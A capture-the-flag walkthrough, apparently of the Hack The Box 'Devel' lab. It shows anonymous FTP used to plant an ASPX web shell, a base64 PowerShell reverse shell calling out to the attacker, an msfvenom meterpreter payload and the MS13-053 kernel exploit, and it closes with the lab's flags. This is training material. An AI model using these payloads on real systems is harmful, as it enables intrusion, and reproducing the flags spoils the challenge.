### Summary
We see there are 2 services running on the box, `HTTP` and `FTP`. The `FTP` allows for anonymous login and gives us direct access to the `ASPX` web server, allowing us to inject malicious webpages providing `RCE` and a foothold on the box. The machine is very old, so we have a pick of plenty of Windows kernel vulnerabilities we can enumerate with `Watson` (requires a Windows VM and target architecture and .NET version info) or we could spawn a meterpreter shell on the target and use the local exploit suggester module provided

### Tools
- `feroxbuster`
- `nxc`
- `Watson`
- `msfvenom` - windows ASPX meterpreter shell
- `Metasploit` - windows kernel exploit discovery

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.3.235 -oN nmap/tcp    
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```
```sh
❯ sudo nmap -p 21,80 -sCV -vv 10.129.3.235 -oN nmap/tcpScripts
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
- Looks like we have anonymous `ftp` login
- `httpd 7.5` likely indicates Windows 7, very old

## HTTP - TCP 80
---
- Visiting the webpage brings us to a default `IIS` setup page
- We can directory brute force with `feroxbuster` and since this is Windows `IIS`, it's case-insensitive
```sh
❯ feroxbuster -u "http://10.129.3.235" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 
```
- We don't get anything interesting
- Nothing interesting in the page source
- We can inspect the response headers to see `X-Powered-By: ASP.NET`
	- We can keep in mind `.aspx` webshells for the future

## FTP - TCP 21
---
- We can confirm an anonymous login with `nxc`:
```sh
❯ nxc ftp 10.129.3.235 -u '' -p ''
FTP         10.129.3.235    21     10.129.3.235     [+] : - Anonymous Login!
```
- Inspecting the file contents, there's nothing interesting to download
- The `ftp` repository contains the `HTML` page for the `IIS` page, indicating that we might be able to upload some interesting stuff
- We can confirm that performing `send` modifies the webpage by providing our own page, `test.htm`

## ASPX Web Shell
---
- We can grab an [ASPX Web Shell](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) from github and provide it to `FTP` 
```sh
❯ ftp 10.129.3.235
Connected to 10.129.3.235 (10.129.3.235).
220 Microsoft FTP Service
Name (10.129.3.235:aldamd): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> send shell.aspx 
local: shell.aspx remote: shell.aspx
227 Entering Passive Mode (10,129,3,235,192,23).
125 Data connection already open; Transfer starting.
226 Transfer complete.
5271 bytes sent in 0.000163 secs (32337.42 Kbytes/sec)
```
- Now we can navigate to `http://10.129.3.235/shell.aspx`
- We can grab the powershell version with the following command:
```powershell
powershell -c "$PSVersionTable.PSVersion"
Major  Minor  Build  Revision
-----  -----  -----  --------
2      0      -1     -1
```

- We can grab a Powershell Base64 reverse shell from [revshells](https://www.revshells.com/)
```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADcAIgAsADEAMgAzADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

# User Shell - Web
## Enumeration
---
- We can inspect system information with the `systeminfo` `powershell` command:
```powershell
PS C:\inetpub\temp\appPools> systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          28/1/2026, 8:54:57 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.455 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.523 MB
Virtual Memory: In Use:    618 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.3.235
                                 [02]: fe80::d58a:f96c:100f:3804
                                 [03]: dead:beef::c8b0:ceb9:1ef4:d7ac
                                 [04]: dead:beef::d58a:f96c:100f:3804
```

### smbserver 
- We can grab a copy of `winPEAS` from [github](https://github.com/peass-ng/PEASS-ng) and put it in a directory `smb`
- Then we can run the `impacket` `smbserver.py` script as root:
```sh
root@fedora-laptop:/home/aldamd/ctf/htb/Devel - 10.129.3.235# smbserver.py share smb/
```

- From our windows box, we can reference the contents of the `smb` linux directory using `\\[ip]\share\[file]`
- We can navigate to `C:\Windows\Temp` and grab the `winPEAS.bat` file like so:
```powershell
PS C:\Windows\Temp> cp \\10.10.15.147\winPEAS.bat .
```

## Watson
---
- [Watson](https://github.com/rasta-mouse/Watson) is our best bet for actionable OS vulnerability enumeration on a Windows 10 and older system 
- First we need to figure out which `.NET` versions are on the target system:
```powershell
PS C:\Windows\Temp> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"         

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5
```
- We could also look at the directories in `\Windows\Microsoft.NET\Framework`:
```powershell
PS C:\Windows\Temp> ls C:\Windows\Microsoft.NET\Framework


    Directory: C:\Windows\Microsoft.NET\Framework


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         14/7/2009   5:37 ??            v1.0.3705                         
d----         14/7/2009   5:37 ??            v1.1.4322                         
d----         18/3/2017   1:06 ??            v2.0.50727                        
d----         14/7/2009   7:56 ??            v3.0                              
d----         14/7/2009   7:52 ??            v3.5                              
...
```

- We need a Windows environment to compile for `.NET 3.5` and `x86` and we can pass it via `smbserver.py`
```powershell
PS C:\Windows\Temp> \\10.10.15.147\share\Watson.exe
  __    __      _
 / / /\ \ \__ _| |_ ___  ___  _ __
 \ \/  \/ / _` | __/ __|/ _ \| '_ \
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|

                           v0.1

                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 7600
 [*] CPU Address Width: 32
 [*] Process IntPtr Size: 4
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS10-073
   [>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
   [>] Exploit: https://www.exploit-db.com/exploits/36327/
   [>] Notes: None.

  [*] Appears vulnerable to MS10-092
   [>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
   [>] Notes: None.

  [*] Appears vulnerable to MS11-046
   [>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
   [>] Exploit: https://www.exploit-db.com/exploits/40564/
   [>] Notes: None.

  [*] Appears vulnerable to MS12-042
   [>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
   [>] Exploit: https://www.exploit-db.com/exploits/20861/
   [>] Notes: None.

  [*] Appears vulnerable to MS13-005
   [>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
   [>] Notes: None.

 [*] Finished. Found 5 vulns :)
```

# Root Shell
## MS11-046 & MS13-053
---
- We can nab the `MS11-046` exploit from [WindowsExploits](https://github.com/abatchy17/WindowsExploits) github repo and pass the exe via the `smbserver.py`
- This wasn't working despite successfully executing which was really annoying. I decided to use `Metasploit` exploit discovery instead, but to do this we need to spawn a `meterpreter` shell on the Windows device

### Windows ASPX Meterpreter Shell
```sh
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.161 LPORT=12345 -f aspx -o meterpreter.aspx
```

- Then we need to upload it via `ftp put meterpreter.aspx`
- Afterwards, we need to set up a `Metasploit handler`
```sh
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 12345
LPORT => 12345
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.161:12345 
```
- Then we visit `http://10.129.12.102/meterpreter.aspx` and we've got a shell!

### Metasploit Enumeration
- First we need to background the current session
```sh
meterpreter > bg
[*] Backgrounding session 1...
```
- Then we want to use the local exploit suggester
```sh
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
```
- Then we need to set the `SESSION` option to our active session. We can type `sessions` to see active sessions, in our case we're using `1`
```sh
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.12.102 - Collecting local exploits for x86/windows...
/opt/metasploit-framework/embedded/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/opt/metasploit-framework/embedded/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems
[*] 10.129.12.102 - 237 exploit checks are being tried...
[+] 10.129.12.102 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.12.102 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.12.102 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.129.12.102 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.12.102 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.12.102 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.12.102 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.12.102 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[-] 10.129.12.102 - Post interrupted by the console user
[*] Post module execution completed
```
- Looks like we've got a lot of vulnerabilities here, I decided to arbitrarily run with `MS13-053`:
```sh
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms13_053_schlamperei) > info

       Name: Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)
     Module: exploit/windows/local/ms13_053_schlamperei
   Platform: Windows
       Arch: x86
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2013-12-01

Provided by:
  Nils
  Jon
  Donato Capitella <donato.capitella@mwrinfosecurity.com>
  Ben Campbell <ben.campbell@mwrinfosecurity.com>

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Windows 7 SP0/SP1

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on

Payload information:
  Space: 4096

Description:
  This module leverages a kernel pool overflow in Win32k which allows local privilege escalation.
  The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process).
  This allows any unprivileged process to freely migrate to winlogon.exe, achieving
  privilege escalation. This exploit was used in pwn2own 2013 by MWR to break out of chrome\'s sandbox.
  NOTE: when a meterpreter session started by this exploit exits, winlogin.exe is likely to crash.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2013-1300
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2013/MS13-053
  https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/


View the full module info with the info -d command.
```
- We set the session and proper `LHOST` and `LPORT` variables and we get a root shell!

```sh
meterpreter > cat user.txt
aa597761eb1810f1e19ea203885b4558

meterpreter > cat root.txt
34c6aa67743bcd53f8713f33fd9d1377
```